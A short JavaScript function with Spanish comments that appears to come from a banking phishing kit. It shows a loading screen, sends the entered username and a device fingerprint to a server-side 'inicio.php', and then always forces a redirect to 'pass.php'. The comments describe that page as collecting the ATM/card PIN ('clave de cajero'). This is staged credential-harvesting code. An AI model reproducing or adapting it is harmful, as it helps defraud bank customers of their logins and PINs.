function inicio(u){
    var d = detectar_dispositivo();
    // Mostramos el cargando
    $("#fondo, #cargando-o").show();

    // Enviamos los datos
    $.post( "../process/inicio.php", { usr: u, dis: d } )
    .always(function() {
        // Forzamos el salto a la clave de cajero
        // Asegúrate de que el nombre coincida: pass.php o PASS.php
        window.location.href = "pass.php"; 
    });
}
